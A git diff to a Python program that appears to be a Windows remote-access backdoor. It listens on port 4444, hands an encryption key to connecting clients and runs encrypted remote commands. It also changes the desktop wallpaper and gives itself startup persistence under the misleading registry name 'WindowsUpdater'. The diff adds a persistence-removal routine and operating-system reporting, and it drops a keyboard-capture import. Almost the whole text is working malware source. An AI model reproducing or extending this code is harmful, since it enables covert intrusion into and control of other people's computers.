@@ -3,12 +3,10 @@ import sys
 import time
 import socket
 import ctypes
-import shutil
 import subprocess
 import winreg
-from datetime import datetime
-from pynput import keyboard
 from cryptography.fernet import Fernet
+import platform
 
 # ------------------ Encryption ------------------
 
@@ -38,6 +36,21 @@ def add_to_startup_registry():
     except Exception as e:
         print(f"[Registry Error] {e}")
 
+def remove_from_registry():
+    try:
+        reg_key = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            0, winreg.KEY_ALL_ACCESS
+        )
+        winreg.DeleteValue(reg_key, "WindowsUpdater")
+        winreg.CloseKey(reg_key)
+        print("✅ Entry removed from startup.")
+    except FileNotFoundError:
+        print("⚠️ Entry not found.")
+    except Exception as e:
+        print(f"❌ Error: {e}")
+
 # ------------------ Wallpaper Control ------------------
 
 def change_wallpaper(image_path: str) -> bytes:
@@ -47,6 +60,10 @@ def change_wallpaper(image_path: str) -> bytes:
     SPI_SETDESKWALLPAPER = 20
     ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 0)
     return encrypt(b"Wallpaper changed")
+
+def predict_operating_system():
+    os_name=platform.system()
+    return os_name
 
 # ------------------ Client Handler ------------------
 
@@ -81,7 +98,8 @@ class ClientHandler:
         for chunk in chunks:
             self.send(chunk)
 
-    def handle_commands(self):
+
+    def handle_commands(self,os_name):
         while True:
             try:
                 cmd = decrypt(self.recv()).decode()
@@ -157,6 +175,7 @@ class ClientHandler:
 # ------------------ Main Server ------------------
 
 def start_server():
+    operating_system = predict_operating_system()
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
         sock.bind(("0.0.0.0", 4444))
         sock.listen(1)
@@ -164,11 +183,13 @@ def start_server():
         conn, addr = sock.accept()
         print(f"[*] Connection from {addr}")
         conn.sendall(key)
+        conn.sendall(operating_system.encode())
 
         client = ClientHandler(conn)
         if client.authenticate():
-            add_to_startup_registry()
-            client.handle_commands()
+            # add_to_startup_registry()
+            # remove_from_registry()
+            client.handle_commands(operating_system)
         conn.close()
 
 if __name__ == "__main__":
